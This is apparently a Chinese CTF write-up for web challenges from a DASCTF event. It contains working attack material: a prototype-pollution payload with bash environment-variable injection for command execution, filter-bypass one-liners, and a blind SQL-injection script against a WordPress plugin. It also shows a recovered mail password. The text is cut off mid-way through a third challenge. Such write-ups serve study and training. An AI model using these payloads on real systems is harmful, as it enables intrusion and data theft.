class="hljs-string">&quot;csplit&quot;</span>, <span class="hljs-string">&quot;sum&quot;</span>, <span class="hljs-string">&quot;expand&quot;</span>, <span class="hljs-string">&quot;getfacl&quot;</span>, <span class="hljs-string">&quot;newgidmap&quot;</span>, <span class="hljs-string">&quot;join&quot;</span>, <span class="hljs-string">&quot;install&quot;</span>, <span class="hljs-string">&quot;bootctl&quot;</span>, <span class="hljs-string">&quot;xzless&quot;</span>, <span class="hljs-string">&quot;runcon&quot;</span>, <span class="hljs-string">&quot;dirname&quot;</span>, <span class="hljs-string">&quot;comm&quot;</span>, <span class="hljs-string">&quot;false&quot;</span>, <span class="hljs-string">&quot;hostname&quot;</span>, <span class="hljs-string">&quot;unlink&quot;</span>, <span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;ipcalc&quot;</span>, <span class="hljs-string">&quot;unexpand&quot;</span>, <span class="hljs-string">&quot;nohup&quot;</span>, <span class="hljs-string">&quot;zegrep&quot;</span>, <span class="hljs-string">&quot;head&quot;</span>, <span class="hljs-string">&quot;getopt&quot;</span>, <span class="hljs-string">&quot;raw&quot;</span>, <span class="hljs-string">&quot;hexdump&quot;</span>, <span class="hljs-string">&quot;mountpoint&quot;</span>, <span class="hljs-string">&quot;lslocks&quot;</span>, <span class="hljs-string">&quot;coreutils&quot;</span>, <span class="hljs-string">&quot;shred&quot;</span>, <span class="hljs-string">&quot;sotruss&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>, <span class="hljs-string">&quot;pldd&quot;</span>, <span class="hljs-string">&quot;uuidparse&quot;</span>, <span class="hljs-string">&quot;localectl&quot;</span>, <span class="hljs-string">&quot;gtar&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;znew&quot;</span>, <span class="hljs-string">&quot;logname&quot;</span>, <span class="hljs-string">&quot;gzexe&quot;</span>, <span class="hljs-string">&quot;rpmquery&quot;</span>, <span class="hljs-string">&quot;touch&quot;</span>, <span class="hljs-string">&quot;hash&quot;</span>, <span class="hljs-string">&quot;cpio&quot;</span>, <span class="hljs-string">&quot;sprof&quot;</span>, <span class="hljs-string">&quot;hostnamectl&quot;</span>, <span class="hljs-string">&quot;env&quot;</span>, <span class="hljs-string">&quot;uname&quot;</span>, <span class="hljs-string">&quot;unxz&quot;</span>, <span class="hljs-string">&quot;zdiff&quot;</span>, <span class="hljs-string">&quot;gdbus&quot;</span>, <span class="hljs-string">&quot;namei&quot;</span>, <span class="hljs-string">&quot;ls&quot;</span>, <span class="hljs-string">&quot;kmod&quot;</span>, <span class="hljs-string">&quot;info&quot;</span>, <span class="hljs-string">&quot;umask&quot;</span>, <span class="hljs-string">&quot;zcmp&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;mktemp&quot;</span>, <span class="hljs-string">&quot;pwd&quot;</span>, <span class="hljs-string">&quot;column&quot;</span>, <span class="hljs-string">&quot;scriptreplay&quot;</span>, <span class="hljs-string">&quot;lessecho&quot;</span>, <span class="hljs-string">&quot;look&quot;</span>, <span class="hljs-string">&quot;setterm&quot;</span>, <span class="hljs-string">&quot;gdbmtool&quot;</span>, <span class="hljs-string">&quot;rpmkeys&quot;</span>, <span class="hljs-string">&quot;bg&quot;</span>, <span class="hljs-string">&quot;id&quot;</span>, <span class="hljs-string">&quot;gpasswd&quot;</span>, <span class="hljs-string">&quot;dracut&quot;</span>, <span class="hljs-string">&quot;vdir&quot;</span>, <span class="hljs-string">&quot;mcookie&quot;</span>, <span class="hljs-string">&quot;elfedit&quot;</span>, <span class="hljs-string">&quot;chown&quot;</span>, <span class="hljs-string">&quot;objcopy&quot;</span>, <span class="hljs-string">&quot;hostid&quot;</span>, <span class="hljs-string">&quot;shuf&quot;</span>, <span class="hljs-string">&quot;view&quot;</span>, <span class="hljs-string">&quot;mknod&quot;</span>, <span class="hljs-string">&quot;gpgparsemail&quot;</span>, <span class="hljs-string">&quot;fc&quot;</span>, <span class="hljs-string">&quot;tail&quot;</span>, <span class="hljs-string">&quot;zforce&quot;</span>, <span class="hljs-string">&quot;last&quot;</span>, <span class="hljs-string">&quot;dir&quot;</span>, <span class="hljs-string">&quot;ionice&quot;</span>, <span class="hljs-string">&quot;read&quot;</span>, <span class="hljs-string">&quot;resolvectl&quot;</span>, <span class="hljs-string">&quot;watchgnupg&quot;</span>, <span class="hljs-string">&quot;unshare&quot;</span>, <span class="hljs-string">&quot;timeout&quot;</span>, <span class="hljs-string">&quot;getconf&quot;</span>, <span class="hljs-string">&quot;findmnt&quot;</span>, <span class="hljs-string">&quot;pr&quot;</span>, <span class="hljs-string">&quot;xzfgrep&quot;</span>, <span class="hljs-string">&quot;ping&quot;</span>, <span class="hljs-string">&quot;rview&quot;</span>, <span class="hljs-string">&quot;fmt&quot;</span>, <span class="hljs-string">&quot;echo&quot;</span>, <span class="hljs-string">&quot;readlink&quot;</span>, <span class="hljs-string">&quot;dd&quot;</span>, <span class="hljs-string">&quot;paste&quot;</span>, <span class="hljs-string">&quot;od&quot;</span>, <span class="hljs-string">&quot;setpriv&quot;</span>, <span class="hljs-string">&quot;coredumpctl&quot;</span>, <span class="hljs-string">&quot;dnf&quot;</span>, <span class="hljs-string">&quot;xzdiff&quot;</span>, <span class="hljs-string">&quot;renice&quot;</span>, <span class="hljs-string">&quot;pkill&quot;</span>, <span class="hljs-string">&quot;mkinitrd&quot;</span>, <span class="hljs-string">&quot;pmap&quot;</span>, <span class="hljs-string">&quot;snice&quot;</span>, <span class="hljs-string">&quot;gio&quot;</span>, <span class="hljs-string">&quot;gpgconf&quot;</span>, <span class="hljs-string">&quot;expr&quot;</span>, <span class="hljs-string">&quot;ulimit&quot;</span>, <span class="hljs-string">&quot;nproc&quot;</span>, <span class="hljs-string">&quot;pidof&quot;</span>, <span class="hljs-string">&quot;watch&quot;</span>, <span class="hljs-string">&quot;cksum&quot;</span>, <span class="hljs-string">&quot;yes&quot;</span>, <span class="hljs-string">&quot;rpmverify&quot;</span>, <span class="hljs-string">&quot;lsblk&quot;</span>, <span class="hljs-string">&quot;catchsegv&quot;</span>, <span class="hljs-string">&quot;uptime&quot;</span>, <span class="hljs-string">&quot;seq&quot;</span>, <span class="hljs-string">&quot;ln&quot;</span>, <span class="hljs-string">&quot;cut&quot;</span>, <span class="hljs-string">&quot;bashbug&quot;</span>, <span class="hljs-string">&quot;curl&quot;</span>, <span class="hljs-string">&quot;gprof&quot;</span>, <span class="hljs-string">&quot;node&quot;</span>, <span class="hljs-string">&quot;npm&quot;</span>, <span class="hljs-string">&quot;corepack&quot;</span>, <span class="hljs-string">&quot;npx&quot;</span>];    <span class="hljs-keyword">const</span> eval_chr = [<span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;&gt;&quot;</span>];    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; command.<span class="hljs-property">length</span>; i++) &#123;        <span class="hljs-keyword">if</span> (cmd.<span class="hljs-title function_">includes</span>(command[i] + <span class="hljs-string">&#x27;&amp;&#x27;</span>) || cmd.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;&amp;&#x27;</span> + command[i]) || cmd.<span class="hljs-title function_">includes</span>(command[i] + <span class="hljs-string">&#x27;|&#x27;</span>) || cmd.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;|&#x27;</span> + command[i]) || cmd.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;;&#x27;</span> + command[i]) || cmd.<span class="hljs-title function_">includes</span>(<span class="hljs-params"><span class="hljs-string">&#x27;(&#x27;</span> + command[i]</span>) || cmd.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;/&#x27;</span> + command[i])) &#123;            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        &#125;    &#125;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> j = <span class="hljs-number">0</span>; j &lt; eval_chr.<span class="hljs-property">length</span>; j++) &#123;        <span class="hljs-keyword">if</span> (cmd.<span class="hljs-title function_">includes</span>(eval_chr[j])) &#123;            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        &#125;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">Door_lock</span>(<span class="hljs-params">cmd</span>) &#123;    pin = <span class="hljs-regexp">/^[a-z ]+$/</span>;    key = <span class="hljs-title class_">LockCylinder</span>(cmd);    <span class="hljs-keyword">if</span> (pin.<span class="hljs-title function_">test</span>(key[<span class="hljs-number">0</span>]) &amp;&amp; <span class="hljs-title function_">check_cmd</span>(cmd.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\s*/g</span>, <span class="hljs-string">&quot;&quot;</span>))) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    &#125;&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123;        <span class="hljs-keyword">if</span> (source.<span class="hljs-title function_">hasOwnProperty</span>(key)) &#123;            <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> target &amp;&amp; <span class="hljs-keyword">typeof</span> target[key] === <span class="hljs-string">&#x27;object&#x27;</span> &amp;&amp; <span class="hljs-keyword">typeof</span> source[key] === <span class="hljs-string">&#x27;object&#x27;</span>) &#123;                <span class="hljs-title function_">merge</span>(target[key], source[key]);            &#125; <span class="hljs-keyword">else</span> &#123;                target[key] = source[key];            &#125;        &#125;    &#125;&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">convertToString</span>(<span class="hljs-params">variable</span>) &#123;    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> variable === <span class="hljs-string">&#x27;string&#x27;</span>) &#123;        <span class="hljs-keyword">return</span> variable;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-keyword">return</span> <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(variable);        &#125; <span class="hljs-keyword">catch</span> (error) &#123;            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Error converting variable to string:&#x27;</span>, error.<span class="hljs-property">message</span>);            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;        &#125;    &#125;&#125;app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;    <span class="hljs-keyword">let</span> msg = req.<span class="hljs-property">body</span>.<span class="hljs-property">msg</span>;    <span class="hljs-keyword">let</span> msgString = <span class="hljs-title function_">convertToString</span>(msg);    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">waf</span>(msgString)) &#123;        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-keyword">const</span> msg_rce = &#123;&#125;;            <span class="hljs-title function_">merge</span>(msg_rce, msg);            <span class="hljs-keyword">if</span> (cmd_rce &amp;&amp; <span class="hljs-title class_">Door</span>_lock(cmd_rce)) &#123;                <span class="hljs-keyword">try</span> &#123;                    <span class="hljs-keyword">const</span> result = proc.<span class="hljs-title function_">execSync</span>(cmd_rce.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\r?\n/g</span>,<span class="hljs-string">&quot;&quot;</span>).<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/[a-zA-Z0-9 ]+=[a-zA-Z0-9 ]+/g</span>,<span class="hljs-string">&quot;114514&quot;</span>).<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/(\$\d+)|(\$SHELL)|(\$_)|(\$\()|(\$&#123;)/g</span>,<span class="hljs-string">&quot;114514&quot;</span>).<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/(\&#x27;\/)|(\&quot;\/)|(\&quot;\.)|(\&quot;\.)|(\&#x27;~)|(\&quot;~)|(\.\/+)/</span>,<span class="hljs-string">&quot;114514&quot;</span>));                    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; result &#125;);                &#125; <span class="hljs-keyword">catch</span> (error) &#123;                    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; <span class="hljs-attr">error</span>: error.<span class="hljs-property">message</span> &#125;);                &#125;            &#125; <span class="hljs-keyword">else</span> &#123;                res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; <span class="hljs-attr">result</span>: <span class="hljs-string">&quot;this is a lock&quot;</span> &#125;);            &#125;        &#125; <span class="hljs-keyword">catch</span> (error) &#123;            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; <span class="hljs-attr">result</span>: <span class="hljs-string">&quot;无事发生&quot;</span> &#125;);        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; <span class="hljs-attr">result</span>: <span class="hljs-string">&quot;this is a waf&quot;</span> &#125;);    &#125;&#125;)app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> &#123;    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Server listening on port 3000&#x27;</span>);&#125;)</code></pre></div><p>直接给出官方WP，说不了一点</p><div class="code-wrapper"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">input_code</span>) &#123;    bypasspin = <span class="hljs-regexp">/%[0-9a-fA-F]&#123;2&#125;/i</span>;    <span class="hljs-keyword">const</span> bypasscode = bypasspin.<span class="hljs-title function_">test</span>(input_code);    <span class="hljs-keyword">if</span> (bypasscode) &#123;        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-keyword">return</span> <span class="hljs-title function_">waf</span>(<span class="hljs-built_in">decodeURIComponent</span>(input_code));        &#125; <span class="hljs-keyword">catch</span> (error) &#123;            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&quot;Error decoding input: &quot;</span>, error);            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        &#125;    &#125;    <span class="hljs-keyword">const</span> blacklist = [<span class="hljs-regexp">/__proto__/i</span>, <span class="hljs-regexp">/constructor/i</span>, <span class="hljs-regexp">/prototype/i</span>];    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> blackword <span class="hljs-keyword">of</span> blacklist) &#123;        <span class="hljs-keyword">if</span> (blackword.<span class="hljs-title function_">test</span>(input_code)) &#123;            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;        &#125;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;&#125;</code></pre></div><p>使decodeURIComponent这个函数报错即可，用%ff这个范围内来报错，使得报error跳过,就可以直接原型链污染了</p><div class="code-wrapper"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">LockCylinder</span>(<span class="hljs-params">input, blackchr = [<span class="hljs-string">&quot;&amp;&amp;&quot;</span>, <span class="hljs-string">&quot;||&quot;</span>, <span class="hljs-string">&quot;&amp;&quot;</span>, <span class="hljs-string">&quot;|&quot;</span>, <span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;;&quot;</span>]</span>) &#123;    <span class="hljs-keyword">const</span> resultArray = [];    <span class="hljs-keyword">let</span> currentPart = <span class="hljs-string">&quot;&quot;</span>;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; input.<span class="hljs-property">length</span>; i++) &#123;        <span class="hljs-keyword">const</span> currentChar = input[i];        <span class="hljs-keyword">if</span> (blackchr.<span class="hljs-title function_">includes</span>(currentChar)) &#123;            <span class="hljs-keyword">if</span> (currentPart.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) &#123;                resultArray.<span class="hljs-title function_">push</span>(currentPart);                currentPart = <span class="hljs-string">&quot;&quot;</span>;            &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            currentPart += currentChar;        &#125;    &#125;    <span class="hljs-keyword">if</span> (currentPart.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) &#123;        resultArray.<span class="hljs-title function_">push</span>(currentPart);    &#125;    <span class="hljs-keyword">return</span> resultArray;&#125;</code></pre></div><p>第二层waf也就是check_cmd</p><p>不允许环境中的程序与 <code>|</code>,<code>&amp;</code>,<code>;</code>连接使用，在<code>LockCylinder</code>中被切分为数组第一个数组部分只允许字母和空格也就是说基本不允许使用带参数的命令</p><p>因此想要执行命令需要找到一个只需要字母的命令来完成命令执行cat、base之类的命令读文件不需要<code>-</code>之类的参数但是由于只允许字母的使用所以没有办法读取当前路径外的文件</p><p>这里是考虑切分数组和不允许与命令连接的符号 <code>|</code>,<code>&amp;</code>,<code>;</code> 和切分数组的符号有不同， 也就是<code>[&quot;&gt;&quot;, &quot;*&quot;, &quot;+&quot;, &quot;$&quot;]</code>，这里是p神的那个在bash环境下的环境变量注入实现命令执行的trick</p><p><a href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html">我是如何利用环境变量注入执行任意命令 | 离别歌 (leavesongs.com)</a></p><div class="code-wrapper"><pre><code class="hljs arcade">cmd_rce.<span class="hljs-built_in">replace</span>(<span class="hljs-regexp">/\r?\n/g</span>,<span class="hljs-string">&quot;&quot;</span>).<span class="hljs-built_in">replace</span>(<span class="hljs-regexp">/[a-zA-Z0-9 ]+=[a-zA-Z0-9 ]+/g</span>,<span class="hljs-string">&quot;114514&quot;</span>).<span class="hljs-built_in">replace</span>(<span class="hljs-regexp">/(\$\d+)|(\$SHELL)|(\$_)|(\$\()|(\$&#123;)/g</span>,<span class="hljs-string">&quot;114514&quot;</span>).<span class="hljs-built_in">replace</span>(<span class="hljs-regexp">/(\&#x27;\/)|(\&quot;\/)|(\&quot;\.)|(\&quot;\.)|(\&#x27;~)|(&quot;~)/</span>,<span class="hljs-string">&quot;114514&quot;</span>)</code></pre></div><p>这里的这两处replace是发现了一些其他的做法加上的waf，分别对应的是</p><div class="code-wrapper"><pre><code class="hljs awk">replace(<span class="hljs-regexp">/[a-zA-Z0-9 ]+=[a-zA-Z0-9 ]+/g</span>),<span class="hljs-string">&quot;114514&quot;</span>echo a &amp;&amp; c=d cat <span class="hljs-regexp">/etc/</span>passwdreplace(<span class="hljs-regexp">/\r?\n/g</span>,<span class="hljs-string">&quot;&quot;</span>)echo a &amp;&amp; <span class="hljs-comment"># \n cat /flag</span>replace(<span class="hljs-regexp">/(\$\d+)|(\$SHELL)|(\$_)|(\$\()|(\$&#123;)/g</span>,<span class="hljs-string">&quot;114514&quot;</span>)env <span class="hljs-variable">$0</span> -c cat /flagreplace(<span class="hljs-regexp">/(\&#x27;\/)|(\&quot;\/)|(\&quot;\.)|(\&quot;\.)|(\&#x27;~)|(&quot;~)/</span>,<span class="hljs-string">&quot;114514&quot;</span>)cat <span class="hljs-string">&#x27;/flag&#x27;</span></code></pre></div><p>最后的payload</p><div class="code-wrapper"><pre><code class="hljs JSON"><span class="hljs-punctuation">&#123;</span>  <span class="hljs-attr">&quot;msg&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>    <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;%ff&quot;</span><span class="hljs-punctuation">,</span>    <span class="hljs-attr">&quot;age&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">25</span><span class="hljs-punctuation">,</span>    <span class="hljs-attr">&quot;city&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Example City&quot;</span><span class="hljs-punctuation">,</span>    <span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>      <span class="hljs-attr">&quot;cmd_rce&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;env $&#x27;BASH_FUNC_echo%%=() &#123; id;&#125;&#x27; bash -c &#x27;echo 123&#x27;&quot;</span>    <span class="hljs-punctuation">&#125;</span>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span></code></pre></div><p><code>env $&#39;cat&#39; /flag</code>以及很多师傅有别的bypass方式</p><h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><p><img src="/../images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240116183051616.png" alt="image-20240116183051616"></p><p>列目录的话，由于</p><div class="code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-keyword">function</span> <span class="hljs-constructor">Door_lock(<span class="hljs-params">cmd</span>)</span> &#123;    pin = /^<span class="hljs-literal">[<span class="hljs-identifier">a</span>-<span class="hljs-identifier">z</span> ]</span>+$/;    key = <span class="hljs-constructor">LockCylinder(<span class="hljs-params">cmd</span>)</span>;    <span class="hljs-keyword">if</span> (pin.test(key<span class="hljs-literal">[<span class="hljs-number">0</span>]</span>)<span class="hljs-operator"> &amp;&amp; </span>check<span class="hljs-constructor">_cmd(<span class="hljs-params">cmd</span>.<span class="hljs-params">replace</span>(<span class="hljs-operator">/</span>\<span class="hljs-params">s</span><span class="hljs-operator">*</span><span class="hljs-operator">/</span><span class="hljs-params">g</span>, <span class="hljs-string">&quot;&quot;</span>)</span>)) &#123;        return <span class="hljs-literal">true</span>;    &#125; <span class="hljs-keyword">else</span> &#123;        return <span class="hljs-literal">false</span>;    &#125;&#125;</code></pre></div><p>限制了以a-z或空格作为开头结尾，所以<code>ls</code>带上<code>-al</code>参数即可</p><p><img src="/../images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240116182837104.png" alt="image-20240116182837104"></p><p><img src="/../images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240116183330740.png" alt="image-20240116183330740"></p><h2 id="EzPenetration"><a href="#EzPenetration" class="headerlink" title="EzPenetration"></a>EzPenetration</h2><p>是一个wordpress，现在的我会直接用wpscan进行扫描</p><p><img src="/../images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240116185030215.png" alt="image-20240116185030215"></p><p>发现 <strong>Registrations for the Events Calendar &lt; 2.7.6 - Unauthenticated SQL Injection</strong> 的漏洞</p><p><img src="/../images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240116185607037.png" alt="image-20240116185607037"></p><p>但是这里的话union语句没有回显，这里的注入点只可以在where语句后面</p><p>Boogipop大佬卡在了这里</p><p>给出官方的脚本</p><div class="code-wrapper"><pre><code class="hljs Python"><span class="hljs-comment">#! /bin/python</span><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():        session = requests.Session()        paramsGet = &#123;<span class="hljs-string">&quot;action&quot;</span>:<span class="hljs-string">&quot;rtec_send_unregister_link&quot;</span>&#125;        result = <span class="hljs-string">&#x27;&#x27;</span>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;wp_option&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).listdir(<span class="hljs-string">&#x27;.&#x27;</span>):                <span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;touch wp_option&#x27;</span>) <span class="hljs-comment"># 用于记录wp_options表的内容</span>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;wp_option&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f: <span class="hljs-comment"># 断点重连</span>                result = f.read()[<span class="hljs-number">0</span>:-<span class="hljs-number">1</span>]        i = <span class="hljs-built_in">len</span>(result)        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:                i = i + <span class="hljs-number">1</span>                head = <span class="hljs-number">30</span>                tail = <span class="hljs-number">130</span>                <span class="hljs-keyword">while</span> head &lt; tail:                        mid = (head + tail) &gt;&gt; <span class="hljs-number">1</span>                        paramsPost = &#123;<span class="hljs-string">&quot;email&quot;</span>:<span class="hljs-string">&quot;r3tr0young@gmail.com&quot;</span>,<span class="hljs-string">&quot;event_id&quot;</span>:<span class="hljs-string">f&quot;3 union select 1,2,3,4,5,6,7,8,9,database() from wp_users where 0^(select(select ascii(substr(group_concat(option_name,0x7e,option_value),<span class="hljs-subst">&#123;i&#125;</span>,1)) from wp_options where option_id = 16)&gt;<span class="hljs-subst">&#123;mid&#125;</span>)-- &quot;</span>&#125;                        cookies = &#123;<span class="hljs-string">&quot;wordpress_test_cookie&quot;</span>:<span class="hljs-string">&quot;WP%20Cookie%20check&quot;</span>&#125;                        response = session.post(<span class="hljs-string">&quot;http://127.0.0.1:8080/wp-admin/admin-ajax.php&quot;</span>, data=paramsPost, params=paramsGet, cookies=cookies)                        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;success&quot;</span> <span class="hljs-keyword">in</span> response.text:                                head = mid + <span class="hljs-number">1</span>                        <span class="hljs-keyword">else</span>:                                tail = mid                <span class="hljs-keyword">if</span> head != <span class="hljs-number">30</span>:                        result += <span class="hljs-built_in">chr</span>(head)                        <span class="hljs-built_in">print</span>(result)                        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;wp_option&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:                                f.write(result)                <span class="hljs-keyword">else</span>:                        <span class="hljs-keyword">break</span>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">restart</span>():        <span class="hljs-keyword">try</span>:                main()        <span class="hljs-keyword">except</span>:                restart()<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:                <span class="hljs-keyword">try</span>:                        main()                <span class="hljs-keyword">except</span>:                        restart()</code></pre></div><p><img src="/../images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240116192204079.png" alt="image-20240116192204079"></p><p><img src="/../images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240116192255238.png" alt="image-20240116192255238"></p><p>现在的buuoj上的题目的话数据库中的只有</p><div class="code-wrapper"><pre><code class="hljs gcode">mailserver_pass~f<span class="hljs-meta">O0</span>C<span class="hljs-meta">O2</span><span class="hljs-attr">#0</span>ky<span class="hljs-attr">#oLgH1</span>JI</code></pre></div><p>这个就是<code>y4nshu@163.com</code>这个用户的密码，就不用修改了</p><p>登陆成功后</p><p>因为 WordPress 自身几乎很少出现过高危漏洞, 所以实战中针对 WordPress 站点的渗透一般都是<strong>第三方主题和插件</strong></p><p>所以修改插件的php代码或者安装一个具有漏洞的插件，如wp-file-manager，进行rce</p><p>感觉直接改代码是不是方便一点，插入一个命令执行语句？或许吧。。。。（就这样吧）</p><h2 id="single-php"><a href="#single-php" class="headerlink" title="single_php"></a>single_php</h2><p>0解题，恐怖如斯</p><p>真没思路，看WP</p><p><img src="/../images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240117225646208.png" alt="image-20240117225646208"></p><div class="code-wrapper"><pre><code class="hljs routeros">?<span class="hljs-attribute">LuckyE</span>=highlight_file</code></pre></div><p>获取源代码</p><div class="code-wrapper"><pre><code class="hljs php">&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;style&gt; img &#123; max-width: <span class="hljs-number">200</span>px; max-height: <span class="hljs-number">200</span>px; &#125; &lt;/style&gt; &lt;title&gt;revenge to siranai.php   &lt;/title&gt;  &lt;/head&gt; &lt;body&gt;  &lt;h5&gt; This is my wife.She is <span class="hljs-keyword">from</span> Imagination. And I,<span class="hljs-keyword">use</span> <span class="hljs-title">her</span> <span class="hljs-title">name</span> <span class="hljs-keyword">as</span> <span class="hljs-title">my</span> <span class="hljs-title">id</span>. &lt;/<span class="hljs-title">h5</span>&gt; &lt;<span class="hljs-title">img</span> <span class="hljs-title">src</span>=&quot;<span class="hljs-title">mywife</span>.<span class="hljs-title">png</span>&quot; <span class="hljs-title">alt</span>=&quot;<span class="hljs-title">this</span> <span class="hljs-title">is</span> <span class="hljs-title">my</span> <span class="hljs-title">wife</span>&quot;&gt; &lt;<span class="hljs-title">p</span>&gt;<span class="hljs-title">I</span> <span class="hljs-title">have</span> <span class="hljs-title">been</span> <span class="hljs-title">single</span> <span class="hljs-title">dog</span> <span class="hljs-title">for</span> 19 <span class="hljs-title">years</span>.&lt;<span class="hljs-title">br</span>&gt; <span class="hljs-title">One</span> <span class="hljs-title">day</span>, <span class="hljs-title">my</span> <span class="hljs-title">brothers</span> <span class="hljs-title">betrayed</span> <span class="hljs-title">the</span> <span 